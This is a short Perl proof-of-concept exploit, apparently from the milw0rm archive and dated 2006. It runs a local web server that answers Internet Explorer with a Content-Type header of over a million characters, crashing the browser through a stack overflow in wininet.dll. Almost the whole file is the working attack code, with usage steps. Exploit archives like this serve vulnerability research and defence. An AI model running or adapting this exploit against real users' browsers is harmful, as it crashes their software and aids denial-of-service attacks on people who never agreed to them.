#!/usr/bin/perl
# Stack overflow in wininet.dll while parsing huge( > ~1M) Content-Type response
# ex.: Unhandled exception at 0x771c00ee in IEXPLORE.EXE: 0xC00000FD: Stack overflow.
#
# discovered by Firestorm
#
# Usage: 
#	  1) run this code
#       2) open http://127.0.0.1/ with IE
#	     

use IO::Socket;
my $sock=new IO::Socket::INET (Listen    => 1,
                                 LocalAddr => 'localhost',
                                 LocalPort => 80,
                                 Proto     => 'tcp');
die unless $sock;
$huge="A" x 1100000;
$|=1;
print ">http server started on port 80... try 'iexplore http://127.0.0.1/' \n";
$z=$sock->accept();
print ">connection!\n";
do
{
	$ln=<$z>;
	print $ln;
	chomp $ln;
	
	if (($ln eq "")||($ln eq "\n")||($ln eq "\r"))
	{
		print ">sending response\n";
		print $z "HTTP/1.1 200 OK\r\nServer: X3 1.0\r\nContent-Type: $huge\r\nConnection: close\r\n\r\ndone";
		close($z);
		exit;
	}
} while (true);

# milw0rm.com [2006-07-20]